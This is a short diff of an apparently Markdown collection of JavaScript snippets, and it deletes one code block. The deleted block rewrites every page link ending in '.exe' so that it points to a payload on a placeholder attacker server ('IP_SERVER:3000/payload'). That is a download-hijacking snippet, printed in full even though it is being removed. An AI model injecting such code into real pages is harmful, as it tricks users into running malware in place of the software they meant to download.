@@ -99,22 +99,6 @@ function end_neela(){
 end_neela();
 ```
 
-
-
-```javascript
-if(document.getElementsByTagName('a') !== undefined){
-  var list = document.getElementsByTagName('a');
-  for(var x = 0;x < list.length;x++){
-    console.log(list[x].href);
-    var current = list[x].href;
-    if(current.indexOf('.exe') > -1){
-      list[x].href = 'http://IP_SERVER:3000/payload'
-    }
-  }
-}
-
-```
-
 ##### Gate receipt
 
 ```javascript
